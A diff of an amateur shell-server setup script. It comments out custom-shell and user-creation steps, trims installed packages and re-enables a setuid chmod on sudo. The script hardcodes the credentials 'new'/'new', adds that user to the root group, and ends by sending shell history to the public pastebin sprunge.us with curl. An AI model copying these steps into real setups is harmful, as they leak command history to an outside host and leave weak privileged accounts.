@@ -25,13 +25,13 @@ fi
 theuser="new"
 password="new"
 
-mv bin/freeshell /bin/freeshell
-echo "/bin/freeshell" >> /etc/shells
-chmod +x  /bin/freeshell
+#mv bin/freeshell /bin/freeshell
+#echo "/bin/freeshell" >> /etc/shells
+#chmod +x  /bin/freeshell
+#groupadd freeshell
+#useradd new -g freeshell -s /bin/freeshell -p `mkpasswd $password` $theuser
 
-useradd new -g freeshell -s /bin/freeshell -p `mkpasswd $password` $theuser
-
-pkg="sudo curl irssi eggdrop supybot"
+pkg="sudo irssi eggdrop supybot"
 
 #check if $pkg is installed if not install
 if dpkg --get-selections | grep -q "^$pkg[[:space:]]*install$" >/dev/null; then 
@@ -56,12 +56,12 @@ usermod -G root,freeshell,sudo new
 apt-get update
 apt-get upgrade
 
-aptitude install apache2 openssh-server harden fail2ban libpam-chroot
+aptitude install harden fail2ban libpam-chroot
 a2enmod userdir
-service apache2 restart
+#service apache2 restart
 
-mv /etc/security/limits.conf /etc/security/limits.conf-old
-c
+#mv /etc/security/limits.conf /etc/security/limits.conf-old
+
 sysctl kernel.randomize_va_space=2
 sysctl net.ipv4.icmp_echo_ignore_broadcasts=1
 sysctl net.ipv4.icmp_ignore_bogus_error_responses=1
@@ -75,13 +75,13 @@ sysctl net.ipv4.tcp_syncookies=1
 sysctl net.ipv4.conf.all.rp_filter=1
 sysctl net.ipv4.conf.all.log_martians=1
  
-mv /etc/ssh/sshd_config /etc/ssh/sshd_config-old
-cp etc/ssh/sshd_config etc/ssh/sshd_config
+#mv /etc/ssh/sshd_config /etc/ssh/sshd_config-old
+#cp etc/ssh/sshd_config etc/ssh/sshd_config
 
 chmod 750 `which ping`
 chmod 750 `which yes`
 chmod 750 `which netstat`
-#chmod 4750 `which sudo`
+chmod 4750 `which sudo`
 
 history | cut -c 8- | curl -F 'sprunge=<-' http://sprunge.us > success
 
